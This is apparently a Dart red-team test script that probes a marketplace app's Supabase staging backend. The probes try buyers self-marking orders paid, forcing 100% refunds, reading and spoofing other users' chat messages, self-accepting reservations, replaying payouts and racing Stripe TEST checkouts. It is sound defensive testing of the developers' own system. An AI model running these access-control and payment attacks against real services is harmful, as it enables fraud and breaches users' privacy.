// ignore_for_file: avoid_print
/// Red Team cego G — PASS 3 composição / races / Stripe TEST.
/// dart run tool/redteam_blind_g_20260829_pass3.dart
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'live_ops_staging_client.dart';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';

Future<Map<String, dynamic>> req(
  String method,
  String u,
  Map<String, String> h, [
  Object? body,
]) async {
  late http.Response r;
  try {
    r = method == 'POST'
        ? await http.post(Uri.parse(u), headers: h, body: jsonEncode(body))
        : method == 'PATCH'
            ? await http.patch(Uri.parse(u), headers: h, body: jsonEncode(body))
            : method == 'DELETE'
                ? await http.delete(Uri.parse(u), headers: h)
                : await http.get(Uri.parse(u), headers: h);
  } catch (e) {
    return {'http': 0, 'body': null, 'text': '$e'};
  }
  dynamic p;
  try {
    p = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    p = r.body;
  }
  return {'http': r.statusCode, 'body': p, 'text': r.body};
}

String clip(Object? v, [int n = 480]) {
  final s = '$v';
  return s.length <= n ? s : '${s.substring(0, n)}…';
}

dynamic firstRow(dynamic body) {
  if (body is List && body.isNotEmpty) return body.first;
  if (body is Map) return body;
  return null;
}

String? idOf(dynamic body) {
  final row = firstRow(body);
  if (row is Map) {
    final s = '${row['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  return null;
}

int? centsOf(Map<String, dynamic> res) {
  try {
    final m = res['body'] is Map ? res['body'] as Map : jsonDecode('${res['text']}');
    if (m is Map) {
      return int.tryParse('${m['server_amount_cents'] ?? m['amount_total'] ?? ''}');
    }
  } catch (_) {}
  return null;
}

String? sessionOf(Map<String, dynamic> res) {
  try {
    final m = res['body'] is Map ? res['body'] as Map : jsonDecode('${res['text']}');
    if (m is Map) return '${m['checkoutSessionId'] ?? ''}';
  } catch (_) {}
  return null;
}

String? urlOf(Map<String, dynamic> res) {
  try {
    final m = res['body'] is Map ? res['body'] as Map : jsonDecode('${res['text']}');
    if (m is Map) return '${m['checkoutUrl'] ?? ''}';
  } catch (_) {}
  return null;
}

Future<void> main() async {
  final e = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(e, 'SUPABASE_URL'));
  if (!url.contains(stagingRef)) {
    stderr.writeln('ABORT');
    exit(2);
  }
  final anon = envRequire(e, 'SUPABASE_ANON_KEY');
  final svc = envRequire(e, 'SUPABASE_SERVICE_ROLE_KEY');
  final buyerId = envRequire(e, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(e, 'LIVE_OPS_TEST_SELLER_ID');
  final sb = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: svc,
  );
  final buyerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final BH = {
    'apikey': anon,
    'Authorization': 'Bearer $buyerTok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final SH = {
    'apikey': anon,
    'Authorization': 'Bearer $sellerTok',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final AH = {
    'apikey': anon,
    'Authorization': 'Bearer $anon',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };
  final SVC = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };

  Future<Map<String, dynamic>?> svcRow(String table, String id) async {
    final r = await req(
      'GET',
      '$url/rest/v1/$table?id=eq.$id&select=*&limit=1',
      SVC,
    );
    final row = firstRow(r['body']);
    return row is Map ? Map<String, dynamic>.from(row) : null;
  }

  final probes = <Map<String, dynamic>>[];
  void add(String id, String surface, String attack, String identity,
      Map<String, dynamic> res,
      {String? before,
      String? after,
      String impact = '',
      String sev = 'info',
      bool persisted = false}) {
    probes.add({
      'id': id,
      'surface': surface,
      'attack': attack,
      'identity': identity,
      'http': res['http'],
      'response': clip(res['text']),
      'before': before,
      'after': after,
      'persisted': persisted,
      'impact': impact,
      'severity_hint': sev,
    });
  }

  final tag = DateTime.now().toUtc().millisecondsSinceEpoch;

  // end leftover mux live from pass2
  await req('PATCH', '$url/rest/v1/lives?id=eq.ae04a7c9-c519-4ab0-97ff-6447ec835f48', SVC, {
    'status': 'ended',
    'is_active': false,
  });

  // ---- off-platform composition: stock + review + wallet ----
  final prodOff = await req('POST', '$url/rest/v1/products', SH, {
    'seller_id': sellerId,
    'title': 'RTG3 mbway $tag',
    'price': 9.00,
    'quantity': 1,
    'list_on_marketplace': true,
    'is_sold': false,
  });
  final pidOff = idOf(prodOff['body']);
  String? offOrder;
  if (pidOff != null) {
    final o = await req('POST', '$url/rest/v1/orders', BH, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pidOff,
      'price_total': 9,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'mb way',
      'shipping_method': 'hand',
    });
    offOrder = idOf(o['body']);
    if (offOrder != null) {
      await req('PATCH', '$url/rest/v1/orders?id=eq.$offOrder', SH, {
        'status': 'reservado',
      });
      final beforeP = await svcRow('products', pidOff);
      final beforeW = await req(
        'GET',
        '$url/rest/v1/wallets?id=eq.$sellerId&select=balance',
        SVC,
      );
      await req('PATCH', '$url/rest/v1/orders?id=eq.$offOrder', SH, {
        'status': 'pago',
      });
      final afterO = await svcRow('orders', offOrder);
      final afterP = await svcRow('products', pidOff);
      add(
        'p3.off.stock_on_pago',
        'STOCK',
        'seller marks MB WAY pago; observe product qty/is_sold',
        'seller',
        {'http': 200, 'text': jsonEncode(afterP)},
        before: 'qty=${beforeP?['quantity']} sold=${beforeP?['is_sold']}',
        after:
            'qty=${afterP?['quantity']} sold=${afterP?['is_sold']} order=${afterO?['status']} paid=${afterO?['amount_paid_cents']} stock_units=${afterO?['stock_units_applied']}',
        impact: 'off-platform confirm',
      );

      final conc = await req(
        'PATCH',
        '$url/rest/v1/orders?id=eq.$offOrder',
        BH,
        {'status': 'concluido'},
      );
      final afterC = await svcRow('orders', offOrder);
      add(
        'p3.off.buyer_concluido',
        'ORDER FSM',
        'buyer PATCH pago(MB WAY) → concluido',
        'buyer',
        conc,
        after: '${afterC?['status']}',
      );

      final rel = await req(
        'POST',
        '$url/rest/v1/rpc/batata_release_seller_wallet_for_order',
        BH,
        {'p_order_id': offOrder},
      );
      final afterW = await req(
        'GET',
        '$url/rest/v1/wallets?id=eq.$sellerId&select=balance',
        SVC,
      );
      add(
        'p3.off.release_wallet',
        'WALLET',
        'release after MB WAY concluido',
        'buyer',
        rel,
        before: clip(beforeW['text'], 80),
        after: clip(afterW['text'], 80),
        impact: 'rpc=${rel['text']}',
        sev: rel['text'] == 'true' ? 'P0' : 'info',
      );

      final rev = await req('POST', '$url/rest/v1/reviews', BH, {
        'order_id': offOrder,
        'buyer_id': buyerId,
        'target_id': sellerId,
        'stars': 5,
        'comment': 'rtg3 offplatform review',
        'author_role': 'buyer',
        'target_type': 'seller',
      });
      final rid = idOf(rev['body']);
      final rrow = rid == null ? null : await svcRow('reviews', rid);
      add(
        'p3.off.review',
        'REVIEWS',
        'review after seller-confirmed MB WAY pago (no Stripe)',
        'buyer',
        rev,
        after:
            'id=$rid verified=${rrow?['purchase_verified']} role=${rrow?['author_role']}',
        persisted: rid != null,
        sev: rid != null && rrow?['purchase_verified'] == true
            ? 'P1'
            : rid != null
                ? 'P2'
                : 'info',
      );
    }
  }

  // buyer self-pago from reserva_pendente (no seller)
  final prod2 = await req('POST', '$url/rest/v1/products', SH, {
    'seller_id': sellerId,
    'title': 'RTG3 selfpago $tag',
    'price': 7.00,
    'quantity': 1,
    'list_on_marketplace': true,
    'is_sold': false,
  });
  final pid2 = idOf(prod2['body']);
  if (pid2 != null) {
    final o = await req('POST', '$url/rest/v1/orders', BH, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid2,
      'price_total': 7,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'mb way',
      'shipping_method': 'hand',
    });
    final oid = idOf(o['body']);
    if (oid != null) {
      final p = await req('PATCH', '$url/rest/v1/orders?id=eq.$oid', BH, {
        'status': 'pago',
      });
      final row = await svcRow('orders', oid);
      add(
        'p3.off.buyer_self_pago',
        'ORDER FSM',
        'buyer PATCH reserva_pendente → pago without seller',
        'buyer',
        p,
        after: '${row?['status']}',
        persisted: '${row?['status']}' == 'pago',
        sev: '${row?['status']}' == 'pago' ? 'P1' : 'info',
      );
      final plat = await req('POST', '$url/rest/v1/orders', BH, {
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'product_id': pid2,
        'price_total': 7,
        'quantity': 1,
        'status': 'reserva_pendente',
        'payment_method': 'pagamento na app (seguro fleaber)',
        'shipping_method': 'hand',
      });
      final poid = idOf(plat['body']);
      if (poid != null) {
        final pp = await req('PATCH', '$url/rest/v1/orders?id=eq.$poid', BH, {
          'status': 'pago',
        });
        final prow = await svcRow('orders', poid);
        add(
          'p3.plat.buyer_self_pago',
          'ORDER FSM',
          'buyer PATCH seguro fleaber reserva → pago',
          'buyer',
          pp,
          after: '${prow?['status']}',
          persisted: '${prow?['status']}' == 'pago',
          sev: '${prow?['status']}' == 'pago' ? 'P0' : 'info',
        );
      }
    }
  }

  // partial refund on paid stripe order
  final paid = await req(
    'GET',
    '$url/rest/v1/orders?buyer_id=eq.$buyerId&amount_paid_cents=gt.0&status=in.(pago,enviado,entregue,concluido)&select=id,status,amount_paid_cents,wallet_refund_processed_at,wallet_release_processed_at&limit=5',
    SVC,
  );
  add('p3.partial.candidates', 'PARTIAL REFUNDS', 'list captured orders',
      'service_role', paid);
  if (paid['body'] is List) {
    for (final raw in paid['body'] as List) {
      if (raw is! Map) continue;
      final id = '${raw['id']}';
      final rpc = await req(
        'POST',
        '$url/rest/v1/rpc/batata_process_partial_refund_dispute',
        BH,
        {'p_order_id': id, 'p_refund_percent': 100},
      );
      add(
        'p3.partial.rpc.$id',
        'PARTIAL REFUNDS',
        'buyer process_partial_refund 100% without dispute offer',
        'buyer',
        rpc,
        before: 'status=${raw['status']} paid=${raw['amount_paid_cents']}',
        sev: rpc['http'] == 200 && '${rpc['text']}' == 'true' ? 'P1' : 'info',
      );
      break;
    }
  }

  // reservation with correct RPC + live item
  final li = await req(
    'GET',
    '$url/rest/v1/live_items?select=id,live_id,quantity,price,product_id&limit=1',
    SVC,
  );
  final liRow = firstRow(li['body']);
  if (liRow is Map) {
    final liveItemId = '${liRow['id']}';
    final liveId = '${liRow['live_id']}';
    final avail = await req(
      'POST',
      '$url/rest/v1/rpc/batata_live_reservation_accept_available',
      BH,
      {'p_live_item_id': liveItemId, 'p_exclude_request_id': null},
    );
    add(
      'p3.res.avail.buyer',
      'WAITLIST / QUEUE',
      'buyer EXECUTE accept_available',
      'buyer',
      avail,
    );
    final ins = await req('POST', '$url/rest/v1/live_reservation_requests', BH, {
      'live_id': liveId,
      'live_item_id': liveItemId,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'requested_qty': 1,
      'status': 'pending',
    });
    add('p3.res.insert.pending', 'LIVE RESERVATIONS',
        'buyer INSERT pending reservation', 'buyer', ins);
    final rid = idOf(ins['body']);
    if (rid != null) {
      final acc = await req(
        'PATCH',
        '$url/rest/v1/live_reservation_requests?id=eq.$rid',
        BH,
        {'status': 'accepted'},
      );
      final after = await svcRow('live_reservation_requests', rid);
      add(
        'p3.res.buyer_self_accept',
        'LIVE RESERVATIONS',
        'buyer PATCH pending → accepted',
        'buyer',
        acc,
        after: '${after?['status']}',
        persisted: '${after?['status']}' == 'accepted',
        sev: '${after?['status']}' == 'accepted' ? 'P1' : 'info',
      );
      final accS = await req(
        'PATCH',
        '$url/rest/v1/live_reservation_requests?id=eq.$rid',
        SH,
        {'status': 'accepted', 'requested_qty': 99},
      );
      final afterS = await svcRow('live_reservation_requests', rid);
      add(
        'p3.res.seller_accept_qty99',
        'LIVE RESERVATIONS',
        'seller PATCH accepted qty=99',
        'seller',
        accS,
        after: 'status=${afterS?['status']} qty=${afterS?['requested_qty']}',
        sev: afterS != null && afterS['requested_qty'] == 99 ? 'P1' : 'info',
      );
    }
  }

  // chat cross-read
  final chats = await req(
    'GET',
    '$url/rest/v1/chats?select=id,user_a,user_b,buyer_id,seller_id&limit=20',
    BH,
  );
  add('p3.chat.list', 'CHAT', 'buyer SELECT chats', 'buyer', chats);
  String? foreignChat;
  if (chats['body'] is List) {
    for (final c in chats['body'] as List) {
      if (c is Map) {
        final a = '${c['user_a'] ?? c['buyer_id'] ?? ''}';
        final b = '${c['user_b'] ?? c['seller_id'] ?? ''}';
        if (a != buyerId && b != buyerId && a.length > 8) {
          foreignChat = '${c['id']}';
          break;
        }
      }
    }
  }
  if (foreignChat != null) {
    final msgs = await req(
      'GET',
      '$url/rest/v1/chat_messages?chat_id=eq.$foreignChat&select=*&limit=5',
      BH,
    );
    add(
      'p3.chat.foreign_msgs',
      'CHAT',
      'buyer SELECT messages of foreign chat',
      'buyer',
      msgs,
      persisted: msgs['body'] is List && (msgs['body'] as List).isNotEmpty,
      sev: msgs['body'] is List && (msgs['body'] as List).isNotEmpty
          ? 'P1'
          : 'info',
    );
  }

  // tip from wallet
  final lives = await req(
    'GET',
    '$url/rest/v1/lives?seller_id=eq.$sellerId&select=id&limit=1',
    SVC,
  );
  final liveIdTip = idOf(lives['body']) ?? (firstRow(lives['body']) is Map
      ? '${(firstRow(lives['body']) as Map)['id']}'
      : '');
  final tip = await req(
    'POST',
    '$url/rest/v1/rpc/batata_send_live_tip_from_wallet',
    BH,
    {
      'p_live_id': liveIdTip.isEmpty ? null : liveIdTip,
      'p_seller_id': sellerId,
      'p_amount': 1,
      'p_message': 'rtg3',
    },
  );
  add('p3.tip.wallet', 'TIPS', 'send_live_tip_from_wallet 1€', 'buyer', tip);

  final tipEdge = await req(
    'POST',
    '$url/functions/v1/create-live-tip-checkout',
    BH,
    {
      'live_id': liveIdTip,
      'seller_id': extraOr(sellerId),
      'amount_eur': 0.5,
    },
  );
  add('p3.tip.edge.low', 'TIPS', 'tip checkout 0.50 / possibly swapped seller',
      'buyer', tipEdge);

  // payout retry as seller 1 cent
  final pay1 = await req(
    'POST',
    '$url/functions/v1/create-connect-account',
    SH,
    {
      'user_id': sellerId,
      'amount': 1,
      'idempotency_key': 'rtg3-payout-$tag',
    },
  );
  final pay1b = await req(
    'POST',
    '$url/functions/v1/create-connect-account',
    SH,
    {
      'user_id': sellerId,
      'amount': 1,
      'idempotency_key': 'rtg3-payout-$tag',
    },
  );
  final pay2 = await req(
    'POST',
    '$url/functions/v1/create-connect-account',
    SH,
    {
      'user_id': sellerId,
      'amount': 1,
      'idempotency_key': 'rtg3-payout-$tag-b',
    },
  );
  add('p3.payout.a', 'PAYOUT', 'seller payout 1¢ key A', 'seller', pay1);
  add('p3.payout.a_retry', 'PAYOUT', 'seller payout 1¢ same key', 'seller',
      pay1b);
  add('p3.payout.b', 'PAYOUT', 'seller payout 1¢ different key', 'seller', pay2);

  // complete-mux as buyer on leftover
  final hijack = await req(
    'POST',
    '$url/functions/v1/complete-mux-live',
    BH,
    {'live_id': 'ae04a7c9-c519-4ab0-97ff-6447ec835f48'},
  );
  add('p3.mux.complete.cross', 'MUX', 'buyer complete-mux-live on seller live',
      'buyer', hijack);

  // storage private object
  final priv = await req(
    'GET',
    '$url/storage/v1/object/chat_media/chat_uploads/probe',
    BH,
  );
  add('p3.stor.private', 'STORAGE', 'GET chat_uploads without auth path',
      'buyer', priv);

  // ---- stock=1 dual session (keep product; do not delete until after pay attempt) ----
  final raceP = await req('POST', '$url/rest/v1/products', SH, {
    'seller_id': sellerId,
    'title': 'RTG3 racepay $tag',
    'price': 5.00,
    'quantity': 1,
    'list_on_marketplace': true,
    'is_sold': false,
  });
  final racePid = idOf(raceP['body']);
  final stripeSessions = <Map<String, dynamic>>[];
  if (racePid != null) {
    final oa = await req('POST', '$url/rest/v1/orders', BH, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': racePid,
      'price_total': 5,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app (seguro fleaber)',
      'shipping_method': 'hand',
    });
    final ob = await req('POST', '$url/rest/v1/orders', BH, {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': racePid,
      'price_total': 5,
      'quantity': 1,
      'status': 'reserva_pendente',
      'payment_method': 'pagamento na app (seguro fleaber)',
      'shipping_method': 'hand',
    });
    final ida = idOf(oa['body']);
    final idb = idOf(ob['body']);
    add('p3.race.order.a', 'STOCK', 'order A stock=1', 'buyer', oa, after: ida);
    add('p3.race.order.b', 'STOCK', 'order B stock=1', 'buyer', ob, after: idb);
    if (ida != null && idb != null) {
      final ca = await req('POST', '$url/functions/v1/create-payment-intent', BH, {
        'order_id': ida,
        'buyer_id': buyerId,
        'shipping_method': 'hand',
      });
      final cb = await req('POST', '$url/functions/v1/create-payment-intent', BH, {
        'order_id': idb,
        'buyer_id': buyerId,
        'shipping_method': 'hand',
      });
      add('p3.race.session.a', 'STRIPE SESSION', 'CPI A', 'buyer', ca,
          after: 'amt=${centsOf(ca)} sid=${sessionOf(ca)}');
      add('p3.race.session.b', 'STRIPE SESSION', 'CPI B', 'buyer', cb,
          after: 'amt=${centsOf(cb)} sid=${sessionOf(cb)}');
      stripeSessions.add({
        'label': 'A',
        'order_id': ida,
        'session_id': sessionOf(ca),
        'checkout_url': urlOf(ca),
        'amount_cents': centsOf(ca),
      });
      stripeSessions.add({
        'label': 'B',
        'order_id': idb,
        'session_id': sessionOf(cb),
        'checkout_url': urlOf(cb),
        'amount_cents': centsOf(cb),
      });

      // settle unpaid
      final sid = sessionOf(ca);
      if (sid != null && sid.startsWith('cs_')) {
        final settle = await req(
          'GET',
          '$url/functions/v1/create-payment-intent?checkout_return=success&session_id=$sid',
          BH,
        );
        final oaAfter = await svcRow('orders', ida);
        add(
          'p3.settle.unpaid',
          'SETTLE',
          'GET return URL on unpaid session A',
          'buyer',
          settle,
          after: 'status=${oaAfter?['status']} paid=${oaAfter?['amount_paid_cents']}',
          sev: '${oaAfter?['status']}' == 'pago' ? 'P0' : 'info',
        );
      }
    }
  }

  // chat insert as other
  final msg = await req('POST', '$url/rest/v1/chat_messages', BH, {
    'chat_id': '00000000-0000-0000-0000-000000000001',
    'sender_id': sellerId,
    'content': 'rtg3 spoof',
  });
  add('p3.chat.spoof_sender', 'CHAT', 'buyer INSERT message as seller', 'buyer',
      msg);

  File('tool/redteam_blind_g_20260829/pass3_stripe_sessions.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert({
    'product_id': racePid,
    'sessions': stripeSessions,
    'note': 'orders kept for Stripe TEST pay; cleanup after capture attempt',
  }));

  // do NOT delete race product/orders — needed for pay
  if (pidOff != null && offOrder == null) {
    await req('DELETE', '$url/rest/v1/products?id=eq.$pidOff', SVC);
  }
  if (pid2 != null) {
    await req('DELETE', '$url/rest/v1/orders?product_id=eq.$pid2', SVC);
    await req('DELETE', '$url/rest/v1/products?id=eq.$pid2', SVC);
  }

  final out = {
    'pass': 3,
    'project': stagingRef,
    'stripe_sessions': stripeSessions,
    'probe_count': probes.length,
    'interesting': probes
        .where((p) =>
            p['severity_hint'] == 'P0' ||
            p['severity_hint'] == 'P1' ||
            p['severity_hint'] == 'P2' ||
            p['persisted'] == true)
        .toList(),
    'probes': probes,
    'production_touched': false,
    'fase4': false,
  };
  File('tool/redteam_blind_g_20260829/pass3_raw.json')
      .writeAsStringSync(const JsonEncoder.withIndent('  ').convert(out));
  stdout.writeln('WROTE pass3 probes=${probes.length} sessions=${stripeSessions.length}');
  for (final p in out['interesting'] as List) {
    stdout.writeln(
      '  ${p['severity_hint']} ${p['id']} ${p['after'] ?? ''} ${p['impact']}',
    );
  }
  for (final s in stripeSessions) {
    stdout.writeln('SESSION ${s['label']} ${s['session_id']} amt=${s['amount_cents']}');
  }
}

String extraOr(String s) => s;
